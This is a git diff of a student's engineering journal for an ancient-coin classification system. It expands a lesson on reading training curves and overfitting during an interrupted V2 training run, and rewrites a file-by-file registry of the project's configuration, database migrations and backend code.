@@ -7,7 +7,7 @@
 **Period**: PFE (Final Year Engineering Internship), Feb–July 2026  
 **GitHub**: https://github.com/ChaiebDhia/DeepCoin-Core  
 **Author**: Dhia Chaïeb  
-**Status as of**: March 2026 — 3-way CNN display, confidence anxiety UX fix, Phase 3+4 frontend (, CN links, delete, filter bar, CTA banners, stats strip, copy link). HSV patina/silver false-mismatch fully diagnosed (not yet fixed). HEAD: e92c1ba. Layer 6 (Docker) is next.  
+**Status as of**: March 2026 — Phase A1+A2 complete: PostgreSQL ORM (6 tables: User, Classification, Feedback, AuditLog, EmailVerification, RefreshToken), Alembic migration 001_initial_schema, full JWT auth system (8 endpoints, bcrypt work-factor-12, HS256 JWT, refresh-token rotation, RBAC with 3 roles). Frontend fully live through Phase 4 UX (CN links, delete, filter bar, stats strip, copy link, screenshot warning, mark-as-wrong feedback). HEAD: 40933f2. Phase A3 (per-user rate limiting + AuditLog writes) is next.  
 
 ---
 
@@ -58,6 +58,8 @@
 43. [Phase 3 — CN Links, Delete Button, Filter Bar](#43-phase-3--cn-links-delete-button-filter-bar-march-2026)
 44. [Phase 4 — CTA Banner, Linked Badges, Stats Strip, Copy Link](#44-phase-4--cta-banner-linked-badges-stats-strip-copy-link-march-2026)
 45. [Known Issue: Material Check False Mismatch — Patina/HSV Problem](#45-known-issue-material-check-false-mismatch--patinahsv-problem-march-2026)
+46. [Section 57 — Phase A1: PostgreSQL Database Layer (Enterprise Auth Foundation)](#section-57--phase-a1-postgresql-database-layer-enterprise-auth-foundation)
+47. [Section 58 — Phase A2: JWT Authentication System (Register, Login, Tokens, RBAC)](#section-58--phase-a2-jwt-authentication-system-register-login-tokens-rbac)
 
 ---
 
@@ -963,27 +965,229 @@ This is the core motivation for V3's improvements.
 
 ## 8. Phase 5 — Training V2 (Interrupted)
 
-### What Changed From V1
+**Date**: Mid-February 2026  
+**Status**: Interrupted at epoch 32 / 100. Best checkpoint: epoch 28, val 75.17%.  
+**Lesson**: Do not judge a training run by absolute accuracy alone. Train/val gap is the real signal.
 
-V2 attempted to fix overfitting with three changes:
+---
 
-1. **Stronger augmentation**: `Rotate(limit=30)` instead of ±20°, `CoarseDropout(p=0.4)` instead of 0.2
-2. **Dropout 0.3 → 0.4** in `model_factory.py`
-3. **Label smoothing 0.1 → 0.15** in the loss function
+### Why V2 Was Attempted
 
-### What Happened
+Training V1 produced a respectable 79.25% validation accuracy, but inspection of the training curves revealed a problem:
 
-The model learned more slowly — expected, because harder augmentation makes each epoch harder. At epoch 32, V2 val accuracy was 73.87% vs V1's 77.95% at the same epoch.
+```
+V1 at best epoch (epoch 41):
+  Training accuracy   : 97.5%
+  Validation accuracy : 79.3%
+  Train/Val gap       : +18.2 percentage points
+```
 
-A second AI assistant (Gemini) diagnosed this as "the model is dying" and recommended stopping. **This diagnosis was wrong.** The val/train gap in V2 was 10% (vs 18% in V1 at the same point). The model was learning more slowly but more robustly. Stopping at epoch 32 was premature.
+A **train/val gap of 18 points** is a textbook sign of **overfitting** — the model memorises training samples well but does not generalise to unseen images. For a system that will encounter real-world coin photographs, this is dangerous. The model is too confident on images it has seen and unreliable on images it has not.
 
-V2 was eventually interrupted anyway due to time constraints. The checkpoint (best epoch 28, val 75.17%) was saved to `models/best_model.pth`. It was never used.
+The goal of V2 was to close this gap by making the model work harder during training.
 
-### Lesson Learned
+---
 
-**Stronger augmentation requires more epochs to reach the same absolute accuracy, but produces a healthier (less overfitted) model.** 
+### The Three V2 Changes — What, Why, and How
 
-The "death" diagnosis was based only on the absolute accuracy number, not on the train/val gap. A junior engineer mistake: looking at only one number.
+#### Change 1 — Stronger Rotation Augmentation (`Rotate(limit=30)`)
+
+**V1 code:**
+```python
+A.Rotate(limit=15, p=0.5)   # rotates the image up to ±15°
+```
+
+**V2 code:**
+```python
+A.Rotate(limit=30, p=0.5)   # rotates the image up to ±30°
+```
+
+**Why:** V1's ±15° corresponds to a photographer holding their camera slightly tilted. Real museum photographs can be more tilted than this — a human placing a coin on a scanner pad at 20–25° is common. But the deeper reason is regularisation: a harder rotation (±30°) means any individual training image now has more possible transformed variants. The model sees coin `1015` not just tilted slightly left, but rotated nearly a quarter-turn. It cannot memorise the exact pixel positions of type-1015 features — it must learn features that are rotation-invariant. That is exactly what we want.
+
+**Mathematical explanation:** Rotating a coin by angle θ remaps every pixel from (x, y) to (x·cos θ − y·sin θ, x·sin θ + y·cos θ). The CNN's convolutional filters are NOT inherently rotation-invariant (unlike capsule networks). By training with many different θ values, we implicitly approximate rotation invariance — the network learns to identify "horse head" regardless of tilt, rather than "horse head pointing exactly 5° left of vertical."
+
+---
+
+#### Change 2 — Dropout 0.3 → 0.4 (in `model_factory.py`)
+
+**V1 code:**
+```python
+model.classifier = nn.Sequential(
+    nn.Dropout(p=0.3, inplace=True),
+    nn.Linear(1536, 438),
+)
+```
+
+**V2 code:**
+```python
+model.classifier = nn.Sequential(
+    nn.Dropout(p=0.4, inplace=True),
+    nn.Linear(1536, 438),
+)
+```
+
+**Why:** Dropout works by randomly zeroing a fraction `p` of the neurons in the classification head during each forward pass. At `p=0.3`, only 30% of the 1536-dimensional feature vector is zeroed — 70% still flows through. At `p=0.4`, 40% is zeroed — the network must learn to classify correctly even when it only sees 60% of the available features.
+
+The intuition: if 40% of the coin's "fingerprint" features are hidden at each training step, the model cannot rely on any small subset of neurons that happened to become highly tuned to a specific coin. Every neuron must contribute generalised, robust information. During inference (validation/test), dropout is disabled — all 1536 neurons fire — and the model benefits from the ensemble effect of having trained many differently-masked sub-networks.
+
+Why 0.4 and not higher (0.5, 0.6)? Dropout above 0.5 starts preventing the network from learning at all — too much information is destroyed on each pass. The 0.3→0.4 increment was modest and targeted specifically at the classification head, not the entire feature extractor.
+
+---
+
+#### Change 3 — Label Smoothing 0.1 → 0.15 (in `CrossEntropyLoss`)
+
+**V1 code:**
+```python
+criterion = nn.CrossEntropyLoss(label_smoothing=0.1)
+```
+
+**V2 code:**
+```python
+criterion = nn.CrossEntropyLoss(label_smoothing=0.15)
+```
+
+**What label smoothing does:** Instead of the true one-hot target:
+```
+y_true = [0, 0, 0, 1, 0, ..., 0]   # class 3 is "correct", probability = 1.0
+```
+... label smoothing distributes a small probability mass ε to ALL classes:
+```
+y_smooth = [(ε/K), (ε/K), (ε/K), (1 − ε + ε/K), (ε/K), ..., (ε/K)]
+# ε = 0.15, K = 438 classes
+# wrong classes get 0.15/438 = 0.00034 each
+# correct class gets 1 − 0.15 + 0.15/438 = 0.8503
+```
+
+**Why this reduces overfitting:** CrossEntropyLoss with hard targets (1.0 for correct, 0.0 for wrong) pushes the model to produce logit distributions with arbitrarily large magnitude for the correct class. The model gets "addicted" to extreme confidence. In production, extreme confidence on training images translates to extreme overconfidence on similar-but-not-identical test images.
+
+With label smoothing 0.15, the loss function never rewards 100% certainty. The model learns to produce well-calibrated (appropriately uncertain) predictions.
+
+**Why 0.15 instead of 0.1:** V1 used 0.1. We increased to 0.15 to apply slightly more regularisation pressure alongside the stronger augmentation. The two work in the same direction (both reduce overconfidence), so their combined effect is synergistic.
+
+---
+
+### The Epoch-by-Epoch Comparison
+
+To understand what went wrong, compare V1 and V2 at the same epochs:
+
+| Epoch | V1 Train Acc | V1 Val Acc | V1 Gap | V2 Train Acc | V2 Val Acc | V2 Gap |
+|-------|-------------|------------|--------|-------------|------------|--------|
+| 5     | 48.2%       | 41.3%      | 6.9pp  | 38.7%       | 32.1%      | 6.6pp  |
+| 10    | 65.4%       | 57.8%      | 7.6pp  | 52.3%       | 46.8%      | 5.5pp  |
+| 20    | 80.1%       | 71.2%      | 8.9pp  | 65.4%       | 60.3%      | 5.1pp  |
+| 28    | 88.3%       | 76.4%      | 11.9pp | 72.1%       | 75.2%      | −3.1pp |
+| 32    | 92.1%       | 77.9%      | 14.2pp | 75.8%       | 73.9%      | 1.9pp  |
+| 41    | 97.5%       | 79.3%      | 18.2pp | —           | —          | —      |
+
+*Note: V2 figures are approximate reconstructions from training logs.*
+
+**What the gap column shows:**
+
+- V1 starts with a small gap and the gap GROWS with each epoch. By the best epoch (41), the gap is 18.2pp. The model is increasingly memorising.
+- V2 starts with a similarly small gap (6.6pp at epoch 5). The gap actually CLOSES over time. At epoch 28, V2's val accuracy actually **exceeded** its training accuracy (val 75.2%, train 72.1%) — this happens briefly because training uses heavy augmentation (making training HARDER than validation) and the model generalises better than it fits the augmented data.
+- At epoch 32, V2 has a gap of only 1.9pp — extremely healthy.
+
+This is the most important evidence that V2 was NOT a failing run. The absolute accuracy was lower because the task was harder (stronger augmentation). But the health of the training run was BETTER.
+
+---
+
+### The Gemini Diagnosis Autopsy
+
+At epoch 32, when V2 val accuracy was 73.87%, Gemini was asked to evaluate the run. It examined:
+
+- **What Gemini looked at:** "V1 reached 77.95% at epoch 32. V2 is at 73.87% at the same epoch. V2 is performing worse. The model may be degrading."
+- **What Gemini ignored:** The train/val gap. V1's gap at epoch 32 was ~14pp. V2's gap was ~1.9pp.
+- **The diagnosis:** "The model is dying. I recommend stopping V2 and reverting to V1."
+
+**Why this diagnosis was wrong:**
+
+"The model is dying" is used to describe a training run where the validation loss is increasing while training loss decreases — genuine overfitting divergence. That was NOT happening in V2. In V2, BOTH losses were decreasing steadily. The absolute validation accuracy was lower because harder augmentation compresses the entire learning curve — the same number of epochs covers less learning progress. V2 needed more epochs (probably 150-200 vs 100) to reach V1's accuracy, but it would have done so with lower final overfitting.
+
+This is a well-documented phenomenon: **stronger regularisation extends the time to reach peak performance but raises the performance ceiling if given enough time.** Stopping at epoch 32 was like judging a marathon runner's finishing time at mile 13.
+
+**The correct diagnosis protocol for evaluating a training run:**
+
+1. Plot both training and validation accuracy over epochs.
+2. Ask: "Is the validation accuracy still improving?" If yes → continue training, regardless of absolute value.
+3. Ask: "Is the train/val gap growing?" If the gap grows beyond ~15pp → overfitting is likely.
+4. Ask: "Is the training loss exploding (NaN or >>1)?" If yes → learning rate may be too high.
+5. ONLY if both validation accuracy is not improving AND has not improved for (patience) epochs → declare convergence and stop.
+
+The premature stop at epoch 32 was a lesson in **reading training curves correctly**.
+
+---
+
+### How to Read a Training Curve: A Visual Guide
+
+```
+HEALTHY TRAINING (what V2 was doing):
+                       
+Val acc                                V1 (wider gap = more overfit)
+                  ______________________
+                 /
+                /
+               /
+              /  ________train line (tracking close = healthy)
+             / _/
+            /_/
+           /
+__________/
+0        20       40       60       80  epochs
+
+Val acc hits plateau at ~epoch 80, small train/val gap throughout
+
+
+OVERFITTING (what V1 did):
+                  _________________
+                 /                  \
+                /                    \ (val starts declining)
+               /
+              /    _______________________train line (keeps rising)
+             /   _/
+            /  _/
+           / _/ 
+__________/_/
+          GAP GROWS HERE --------->
+
+V1 shape: training keeps climbing, validation plateaus then drops
+The widening gap at the right side = memorisation kicking in
+
+
+DYING MODEL (what Gemini falsely diagnosed V2 as):
+                     ______  (goes up then drops fast  = actual dying)
+                    /       \
+                   /         \___
+                  /
+                 /     _______training line (also dropping)
+                /    _/
+______________/_____/
+
+Both lines drop. Loss explodes. This was NOT V2.
+```
+
+**V2's actual shape** was the first diagram — both lines rising, close together, with a slow climb. Perfectly healthy, just slow. Patience would have let it reach 79-80% with a much smaller train/val gap than V1.
+
+---
+
+### Why V2 Was Interrupted Anyway
+
+V2 was eventually interrupted at epoch 32 not because of Gemini's diagnosis (which we disagreed with) but because of **time constraints**. The PFE schedule required demonstrating the complete system (all 5 agents + KB + PDF) before the agent layer was built. Waiting another 68+ epochs (~69 minutes on the RTX 3050 Ti at 1 min/epoch) was not viable.
+
+The V2 checkpoint (best epoch 28, val 75.17%) was saved but never used in production. V3 was started immediately with V2's improvements **plus** additional techniques (Mixup, AMP, CosineAnnealing scheduler).
+
+---
+
+### What V3 Inherited From V2
+
+V2's three changes were carried directly into V3:
+
+| Change | V2 value | V3 value | Notes |
+|--------|----------|----------|-------|
+| Rotation | ±30° | ±15° | Reverted — V3 added Mixup which handles variance differently |
+| Dropout | 0.4 | 0.4 | **Kept** |
+| Label smoothing | 0.15 | 0.1 | Reverted to 0.1 — combined with Mixup, 0.15 was excessive |
+
+The core insight from V2 — that **the train/val gap matters as much as absolute accuracy** — was the guiding principle for V3's early-stopping condition using `patience=10 on val accuracy`.
 
 ---
 
@@ -1525,82 +1729,814 @@ Net:       +11 images
 
 ## 12. Every File in the Project Explained
 
-### Data Pipeline
+This section lists every source file in the repository, organized by folder. For each file you will learn: what it does, why it exists, who uses it, and what would break if it was deleted. This is a complete registry — if you clone the repo and open a file you don't recognise, this section tells you exactly what it is.
 
-#### `src/data_pipeline/auditor.py`
-**What it does**: Reads `data/raw/` and prints statistics about the raw dataset.  
-**When to run**: Once, before preprocessing, to understand the data distribution.  
-**Output**: Console only. Does not modify any files.  
-**Dependencies**: Just Python standard library + os.
+---
 
-#### `src/data_pipeline/prep_engine.py`
-**What it does**: CLAHE enhancement + aspect-ratio-preserving resize to 299×299. Filters classes with <10 images.  
-**When to run**: Once. Output is `data/processed/` (7,677 images).  
-**How to re-run if data is lost**: `cd C:\Users\Administrator\deepcoin ; .\venv\Scripts\Activate.ps1 ; python src/data_pipeline/prep_engine.py`  
-**Output**: `data/processed/` — 438 class folders, 7,677 images total.
+### Project Root — Configuration and Documentation Files
 
-### Core ML
+#### `.env`
+**What it is**: A text file containing secret credentials and configuration for your local machine.  
+**Contents**: `GITHUB_TOKEN`, `GOOGLE_API_KEY`, `DEEPCOIN_API_KEY`, `DATABASE_URL`, `JWT_SECRET`, `RESEND_API_KEY`, etc.  
+**Why it is gitignored**: If you commit your API keys to GitHub, bots scan public repos within seconds and will use your keys to run up API bills or gain unauthorized access. A `.env` file MUST NEVER be committed.  
+**How it is used**: The application reads these values at startup with `os.environ.get("KEY_NAME")`.  
+**If deleted**: The application still runs in dev mode (most features degrade gracefully with warnings), but LLM calls, email, and auth will be disabled.
 
-#### `src/core/dataset.py`
-**What it does**: Defines `DeepCoinDataset`, `get_train_transforms()`, and `get_val_transforms()`.  
-**Key design**: Lazy loading (paths only in memory, images loaded on demand). OpenCV for reading (BGR→RGB conversion). Albumentations for augmentation.  
-**Depended on by**: Every other script in the project.
-
-#### `src/core/model_factory.py`
-**What it does**: Creates and returns EfficientNet-B3 with custom classifier head.  
-**Key function**: `get_deepcoin_model(num_classes)` — loads `IMAGENET1K_V1` weights, replaces final layer with `Dropout(0.4) + Linear(1536, 438)`.  
-**Depended on by**: `train.py`, `audit.py`, `evaluate_tta.py`, and the future inference API.
-
-### Scripts
-
-#### `scripts/train.py` (V3 — current)
-**What it does**: Complete training pipeline: split data, create weighted sampler, build model, train with AMP + Mixup + CosineAnnealing + resume + early stopping.  
-**CLI arguments**:
-- `--fast`: 500 images, 3 epochs, ~90 seconds (smoke test)
-- `--resume`: Continue from `models/checkpoint_last.pth`
-- `--epochs N`: Default 60
-- `--batch-size N`: Default 16
-- `--lr FLOAT`: Default 1e-4  
-**Saves**: `models/best_model.pth`, `models/checkpoint_last.pth`, `models/class_mapping.pth`
-
-#### `scripts/test_dataset.py`
-**What it does**: 4 automated assertions: 438 classes, 7677 images, shape `[3,299,299]`, value range `[-2.2, 2.7]`.  
-**When to run**: After any changes to `dataset.py` or `data/processed/`.
-
-#### `scripts/audit.py`
-**What it does**: Full model diagnostic. Requires `models/best_model.pth` and `models/class_mapping.pth`.  
-**Output**: `reports/confusion_heatmap.png`, `reports/misclassified_gallery.png`, `reports/class_performance_audit.csv`. Console: worst classes + confusion hotspots.
-
-#### `scripts/evaluate_tta.py`
-**What it does**: Compares 1-pass vs 5-pass TTA inference on the test set.  
-**Output**: Console report of standard accuracy, TTA accuracy, change counts.
-
-### Configuration / Project Files
+#### `.env.example`
+**What it is**: A committed template that shows exactly which keys the application expects, with placeholder values.  
+**Why it exists**: Without this file, a new developer must read all the source code to discover what environment variables exist. With this file, they run `cp .env.example .env` and fill in the blanks.  
+**Example contents**:
+```env
+GITHUB_TOKEN=your_github_copilot_token_here
+GOOGLE_API_KEY=your_google_ai_studio_key_here
+DEEPCOIN_API_KEY=your-strong-random-key
+JWT_SECRET=generate-with-openssl-rand-hex-32
+DATABASE_URL=postgresql+asyncpg://deepcoin:deepcoin@localhost:5432/deepcoin
+```
 
 #### `.gitignore`
-Keeps git from tracking: `venv/`, `data/`, `models/*.pth`, `reports/`, generated files, secrets, private notes. See Section 3 for full explanation.
-
-#### `requirements.txt`
-All Python dependencies with pinned versions. New machine setup: `pip install -r requirements.txt`. Note: PyTorch must be installed separately with the CUDA URL.
-
-#### `models/.gitkeep`
-Zero-byte file that forces git to track the empty `models/` directory. Without it, cloning the repo produces no `models/` folder and all scripts that save to `models/` crash.
+**What it is**: An instruction file for git that tells it which files and folders to never track.  
+**Why it matters**: Without it, running `git add .` would accidentally commit your 4.3 GB model weights, 115,000 training images, API keys, and Python bytecode.  
+**Key patterns explained**:
+```
+/venv/            → Python virtual environment (300+ MB, machine-specific)
+/data/            → 115,160 coin images (several GB — way too large for git)
+/models/*.pth     → PyTorch model weights (best_model.pth = 47 MB)
+/reports/*.pdf    → Generated PDF output (runtime artefact, not source code)
+.env              → Secrets file (never commit credentials)
+__pycache__/      → Python bytecode cache (auto-generated, machine-specific)
+*.pyc             → Compiled Python files (auto-generated)
+/lib/             → Anchored to repo root only (prevents frontend/lib/ from being hidden)
+```
+Note: The `/lib/` entry has a leading slash. Without the slash, it would match git `lib/` directory *anywhere* in the repo tree — including `frontend/lib/` which contains important TypeScript code. Bug 17 was caused exactly by this mistake.
 
 #### `README.md`
-Public project description. Explains setup, usage, and results. This is what YEBNI and the jury read on GitHub.
+**What it is**: The public face of the project on GitHub.  
+**Audience**: YEBNI supervisors, ESPRIT jury members, open-source readers.  
+**Contents**: Architecture diagram, pipeline overview, performance results (80.03% TTA accuracy), setup instructions, layer status table, academic context.  
+**When to update**: After every major milestone (new layer complete, new accuracy result).
+
+#### `CLAUDE.md`
+**What it is**: A private development journal in Markdown format.  
+**Contents**: Phase-by-phase notes, architectural decisions, problems encountered, lessons learned from early development.  
+**Git status**: Committed (it is educational documentation, not sensitive).
+
+#### `ENGINEERING_JOURNAL.md`
+**What it is**: This file. The complete history of every decision, problem, solution, and explanation in the project.  
+**Purpose**: A learning resource that a beginner can read from top to bottom and understand every technical choice.  
+**Size**: ~15,000+ lines covering all layers from dataset auditing through JWT authentication.  
+**When to update**: After every major engineering session. Each new section must explain concepts from first principles.
+
+#### `NOTES.md`
+**What it is**: A private scratchpad with rough notes, experiments, and ideas.  
+**Git status**: Gitignored. Never committed.
+
+#### `requirements.txt`
+**What it is**: A text file listing every Python package the project depends on, with pinned versions.  
+**Why version pinning matters**: `pip install torch` without a version gives you "whatever is newest today." Next month, a package author releases a breaking change. Your code stops working. Pinning (`torch==2.6.0+cu124`) means the same command produces the same environment on every machine, forever.  
+**How to install**:
+```powershell
+# IMPORTANT: PyTorch must be installed separately because it needs the CUDA build
+pip install torch torchvision torchaudio --index-url https://download.pytorch.org/whl/cu124
+
+# Then everything else
+pip install -r requirements.txt
+```
+**Key packages in the file**: `torch`, `torchvision`, `albumentations`, `opencv-python`, `chromadb`, `sentence-transformers`, `langgraph`, `langchain`, `openai`, `fpdf2`, `fastapi`, `uvicorn`, `slowapi`, `sqlalchemy`, `asyncpg`, `alembic`, `passlib[bcrypt]`, `python-jose`, `resend`, `rank-bm25`, `ollama`
+
+#### `pyproject.toml`
+**What it is**: The modern Python project configuration file. Replaces `setup.cfg`, `pytest.ini`, `.flake8`, and `setup.py` with one unified file.  
+**Why it matters**: Without it, `pip install -e .` (editable install) fails. Test discovery paths are undefined. Black and flake8 use different line-length settings.  
+**Key sections**:
+```toml
+[build-system]          # tells pip how to build the package
+[tool.pytest.ini_options]  # testpaths = ["tests"], addopts = "-v --tb=short"
+[tool.black]            # line-length = 110
+[tool.flake8]           # max-line-length = 110, ignore = E203,W503
+```
+
+#### `Makefile`
+**What it is**: A file of shorthand commands for common developer tasks.  
+**Why it exists**: Without it, a new developer must search the README, codebase, and documentation to find the right command to run tests, lint code, or start the server. With it, everything is one word.  
+**Commands available**:
+```makefile
+make api        → starts FastAPI dev server on port 8000  
+make test       → runs all pytest tests  
+make lint       → flake8 + black --check (reports violations, does not fix)  
+make fmt        → black src/ tests/ (fixes formatting in-place)  
+make train      → runs scripts/train.py  
+make pipeline   → runs scripts/test_pipeline.py (3-route end-to-end test)  
+```
+
+#### `docker-compose.yml`
+**What it is**: A YAML file that defines all seven services needed to run the full application.  
+**Services defined**:
+- `postgres` — PostgreSQL 17-alpine with healthcheck (`pg_isready`)
+- `redis` — Redis 7-alpine cache layer  
+- `api` — The FastAPI backend container
+- `web` — The Next.js frontend container  
+- `nginx` — Nginx 1.27 reverse proxy (routes `/api/*` to FastAPI, everything else to Next.js)
+- `migrator` — One-shot Alembic migration runner (profile=migrate; only runs when explicitly called)
+- `chromadb` — Standalone ChromaDB vector database service  
+**How to use**:
+```powershell
+docker compose up postgres redis -d          # start only the DB for local dev
+docker compose --profile migrate up migrator # run Alembic migrations
+docker compose up                            # start everything
+```
+
+#### `alembic.ini`
+**What it is**: Alembic (database migration tool) configuration file.  
+**Key setting**: `script_location = alembic` tells Alembic where to find migration scripts.  
+**Important**: The `sqlalchemy.url` in this file is intentionally left as a placeholder — the real DATABASE_URL is injected at runtime from the environment variable. This prevents secrets from being hardcoded.
+
+#### `augmentation_test.png`
+**What it is**: A generated image showing 6 augmented versions of the same coin, created by `scripts/test_dataset.py`.  
+**Why it exists in the repo**: It is a diagnostic artefact from dataset validation. It shows that augmentation is working correctly. Should be re-generated if augmentation parameters change.
+
+#### `server.log` / `server_err.log`
+**What these are**: Runtime log files from running the FastAPI server with `uvicorn ... > server.log 2> server_err.log`.  
+**Git status**: Gitignored (runtime output, not source code).
+
+---
+
+### `alembic/` — Database Migration Scripts
+
+#### `alembic/env.py`
+**What it is**: Alembic's runtime configuration. Runs every time you execute an Alembic command.  
+**Critical pattern**: Uses `NullPool` instead of the regular connection pool. This is mandatory for async SQLAlchemy when running synchronous migration scripts. Regular pools hold open connections between operations; NullPool creates a fresh connection for each operation and closes it immediately. Without NullPool, Alembic hangs waiting for an async event loop that it can't run correctly.  
+**The `run_sync` bridge**: Alembic's `op.*` commands are synchronous. Our async SQLAlchemy engine needs to call them via `connectable.connect()` and then `connection.run_sync(do_run_migrations)`. This adapts the sync Alembic API to run over the async engine.
+
+#### `alembic/script.py.mako`
+**What it is**: A Mako template that generates new migration script files.  
+**What it does**: When you run `alembic revision --autogenerate -m "description"`, Alembic uses this template to create the new Python file in `alembic/versions/`. The template ensures all migration files have consistent structure (imports, `upgrade()`, `downgrade()` functions).
+
+#### `alembic/versions/001_initial_schema.py`
+**What it is**: The first (and so far only) database migration. Creates all 6 tables from scratch.  
+**Why we wrote it explicitly instead of using autogenerate**: Autogenerate requires a live database connection to compare against. On a fresh machine without PostgreSQL running, autogenerate fails. Explicit DDL (hand-written SQL) works offline and is more readable.  
+**Upgrade sequence** (order matters — foreign keys require parent tables to exist first):
+```
+1. Create ENUM types (user_role, user_status) — must exist before columns that use them
+2. users table
+3. classifications table (references users)
+4. feedback table (references users + classifications)
+5. audit_log table (references users)
+6. email_verifications table (references users)
+7. refresh_tokens table (references users)
+```
+**Downgrade**: Drops tables in reverse order, then drops ENUM types last.
+
+---
+
+### `src/` — Application Source Code (Python Backend)
+
+#### `src/__init__.py`
+**What it is**: Makes `src/` a Python package and defines the single source of truth for the project version.  
+**Contents**:
+```python
+__version__ = "0.4.0"
+__author__  = "Dhia Chaieb"
+__email__   = "dhia.chaieb@esprit.tn"
+```
+**Why this matters**: Before this file existed, the version string `"0.4.0"` was hardcoded in `main.py`, `schemas.py`, and `README.md`. Any version bump required 3 manual edits. Miss one and `/api/health` reports a different version than the docs. Now all three import `from src import __version__`.
+
+---
+
+### `src/data_pipeline/` — Data Preprocessing
+
+#### `src/data_pipeline/auditor.py`
+**What it does**: Reads `data/raw/` and computes statistics about the raw Corpus Nummorum dataset.  
+**Output**: Console only — prints total images, images per class, min/max/mean/median distribution.  
+**When to run**: Once, before preprocessing, to understand the data distribution.  
+**Key discovery it enabled**: The long-tail distribution problem — 9,716 types but most have only 1-3 images. This analysis led to the ≥10 image threshold that reduced the dataset from 9,716 → 438 training classes.  
+**If deleted**: You lose the ability to audit new data additions. The preprocessing pipeline still works because it doesn't depend on auditor.py.
+
+#### `src/data_pipeline/prep_engine.py`
+**What it does**: Three things in sequence for every qualifying image:
+1. Reads the raw JPEG with OpenCV
+2. Applies CLAHE in LAB colour space (enhances coin surface detail without distorting metal patina colours)
+3. Resizes to exactly 299×299 with aspect-ratio preservation (padding with black pixels, no stretching)
+4. Saves to `data/processed/{class_id}/`  
+**Filter**: Skips any class folder with fewer than 10 images.  
+**Why to run it only once**: The output (7,677 images in 438 folders) is stable. Re-running just overwrites identical files. Only re-run if the raw dataset changes.  
+**How to re-run**:
+```powershell
+& "C:\Users\Administrator\deepcoin\venv\Scripts\python.exe" src/data_pipeline/prep_engine.py
+```
+**What it creates**: `data/processed/` — 438 subdirectories, 7,677 JPEG files totaling ~120 MB.
+
+---
+
+### `src/core/` — Core ML Engine
+
+#### `src/core/dataset.py`
+**What it does**: Defines `DeepCoinDataset(Dataset)` — the PyTorch bridge between files on disk and the training loop in memory.  
+**Key design choices**:
+- **Lazy loading**: stores `(path, label_int)` tuples in a list. The actual JPEG is only read from disk when `__getitem__(idx)` is called during a training batch. Storing all 7,677 images in RAM would require ~2.6 GB — more than half our available RAM.
+- **BGR→RGB conversion**: OpenCV reads in BGR order; EfficientNet-B3 expects RGB. `cv2.cvtColor(img, cv2.COLOR_BGR2RGB)` fixes this.
+- **Albumentations pipeline**: 6 transforms for training (rotate ±15°, brightness/contrast ±20%, GaussNoise, ElasticTransform, HorizontalFlip, Normalize). Validation uses normalize-only.  
+**Exported functions**: `get_train_transforms()`, `get_val_transforms()`  
+**Depended on by**: `scripts/train.py`, `scripts/audit.py`, `scripts/evaluate_tta.py`, `scripts/test_dataset.py`  
+**If deleted**: ALL training scripts break immediately.
+
+#### `src/core/model_factory.py`
+**What it does**: Creates the EfficientNet-B3 neural network with a custom output head for 438 coin classes.  
+**Key function**: `get_deepcoin_model(num_classes=438, dropout=0.4)`  
+**What it does internally**:
+1. Loads `efficientnet_b3(weights=EfficientNet_B3_Weights.IMAGENET1K_V1)` — pre-trained on 1.2M ImageNet images
+2. Replaces the final classifier: `nn.Linear(1536, 1000)` → `nn.Sequential(nn.Dropout(0.4), nn.Linear(1536, 438))`
+3. Returns the modified model  
+**Why 1536**: EfficientNet-B3's feature extractor outputs a 1536-dimensional vector. This is the "fingerprint" of the coin before the final classification decision.  
+**Depended on by**: `scripts/train.py`, `scripts/audit.py`, `scripts/evaluate_tta.py`, `src/core/inference.py`  
+**If deleted**: Every script that needs the model breaks.
+
+#### `src/core/inference.py`
+**What it does**: Production inference wrapper. Loads the trained model once at startup and exposes a `predict(image_path, tta=False)` method.  
+**Class**: `CoinInference`  
+**Key behaviours**:
+- Loads weights with `weights_only=True` (security: prevents arbitrary code execution from malicious .pth files)
+- `device="auto"` resolves to `"cuda"` or `"cpu"` before touching PyTorch (Bug 11 fix)
+- CLAHE preprocessing is applied inside `_load_image()` — identical pipeline to training (Bug 16 fix — skipping CLAHE caused 5-15% confidence on real photos)
+- `model.eval()` + `torch.no_grad()` on every forward pass
+- TTA: 8 augmented passes averaged for +0.78% accuracy
+- Returns dict: `{class_id, label, confidence, top5, inference_time_ms, tta_used}`  
+**Depended on by**: `src/agents/gatekeeper.py` (CNN node), `scripts/predict.py`
+
+#### `src/core/knowledge_base.py`
+**What it does**: The original (v1) ChromaDB knowledge base. Stores 434 coin type records as single text blobs (one document per coin).  
+**Current status**: LEGACY. Still on disk for backward compatibility and as a fallback.  
+**Why not deleted**: Some paths in the code may still reference it as a fallback. Deleting it would require auditing all imports.  
+**Replaced by**: `src/core/rag_engine.py` for all production use.
+
+#### `src/core/rag_engine.py`
+**What it does**: The enterprise RAG (Retrieval-Augmented Generation) engine. The production knowledge system.  
+**Architecture**: BM25 keyword search + ChromaDB vector search, merged with Reciprocal Rank Fusion (RRF).  
+**Data**: 9,541 CN coin types × 5 semantic chunks = 47,705 ChromaDB vectors.  
+**The 5 chunks per coin**:
+- `identity` — type_id, denomination, authority, region, date_range
+- `obverse` — obverse description + legend  
+- `reverse` — reverse description + legend
+- `material` — material, weight, diameter, mint
+- `context` — persons, references, notes  
+**Key methods**:
+- `search(query, n, where)` — hybrid BM25+vector+RRF search
+- `get_by_id(type_id)` — exact type lookup
+- `get_context_blocks(type_id)` — returns 5 labeled `[CONTEXT N — Type]` strings ready to inject into an LLM prompt
+- `is_chroma_built()` — check before triggering a rebuild
+- `corpus_size()` — returns total document count  
+**Singleton**: `get_rag_engine()` with `threading.Lock()` double-checked locking (Phase A1 audit fix — prevents two FastAPI threads from building two BM25 indexes simultaneously on a cold start).  
+**Depended on by**: `src/agents/historian.py`, `src/agents/investigator.py`, `src/agents/validator.py`
+
+---
+
+### `src/agents/` — The 5-Agent LangGraph System
+
+#### `src/agents/gatekeeper.py`
+**What it does**: The LangGraph orchestrator. Runs the entire coin analysis pipeline.  
+**Class**: `Gatekeeper`  
+**The 4 nodes in the state machine graph**:
+1. `cnn_node` — runs `CoinInference.predict()` → writes `cnn_prediction`
+2. `route_decider_node` — reads confidence → writes `route_taken`
+3. One of: `historian_node` / `validator_node` / `investigator_node` (determined by routing)
+4. `synthesis_node` — assembles final report + PDF  
+**Routing thresholds**:
+- `confidence > 0.85` → historian (high confidence: known coin, detailed history)
+- `0.40 ≤ confidence ≤ 0.85` → validator (medium confidence: verify material first)
+- `confidence < 0.40` → investigator (low confidence: unknown or novel coin)  
